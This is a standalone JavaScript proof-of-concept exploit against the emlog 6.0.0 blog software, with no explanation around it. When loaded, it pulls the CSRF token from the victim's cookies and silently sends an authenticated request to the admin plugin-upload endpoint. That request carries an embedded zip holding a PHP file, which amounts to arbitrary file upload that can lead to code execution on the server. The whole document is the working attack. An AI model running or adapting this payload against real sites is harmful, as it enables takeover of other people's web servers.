var token = document.cookie.split("; ")
for (var i = 0;i<token.length;i++){
	var jb = token[i].split('TOKENCOOKIE_');if (jb.length ==2){var tmp_token = jb[1].split('=');var haha = tmp_token[1];}
}

      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/192.168.133.128\/emlog_6.0.0\/src\/admin\/plugin.php?action=upload_zip", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------209804837410403324034068907654");
        xhr.withCredentials = true;
        var body = "-----------------------------209804837410403324034068907654\r\n" + 
          "Content-Disposition: form-data; name=\"pluzip\"; filename=\"1.zip\"\r\n" + 
          "Content-Type: application/x-zip-compressed\r\n" + 
          "\r\n" + 
          "PK\x03\x04\n" + 
          "\x00\x00\x00\x00\x00v\xbc\x0fU\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x001/PK\x03\x04\x14\x00\x00\x00\x08\x00\xa9\xb8\x0fUP\x83\xcc}\x12\x00\x00\x00\x12\x00\x00\x00\x07\x00\x00\x001/1.php\xb3\xb1/\xc8(P\x00\xe2\xcc\xbc\xb4|\rMk{;\x00PK\x01\x02\x1f\x00\n" + 
          "\x00\x00\x00\x00\x00v\xbc\x0fU\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00$\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x001/\n" + 
          "\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xf3\x1cw\xaf\xbc\xb0\xd8\x01\xf3\x1cw\xaf\xbc\xb0\xd8\x01c\xe3\xa9\xaa\xbc\xb0\xd8\x01PK\x01\x02\x1f\x00\x14\x00\x00\x00\x08\x00\xa9\xb8\x0fUP\x83\xcc}\x12\x00\x00\x00\x12\x00\x00\x00\x07\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00 \x00\x00\x001/1.php\n" + 
          "\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\x12\xca\xb3n\xb8\xb0\xd8\x01\xe6\xe8\xca{\xb8\xb0\xd8\x01\x04.\xf0c\xb8\xb0\xd8\x01PK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xad\x00\x00\x00W\x00\x00\x00\x00\x00\r\n" + 
          "-----------------------------209804837410403324034068907654\r\n" + 
          "Content-Disposition: form-data; name=\"token\"\r\n" + 
          "\r\n" + 
          "" + haha + "\r\n" + 
          "-----------------------------209804837410403324034068907654--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();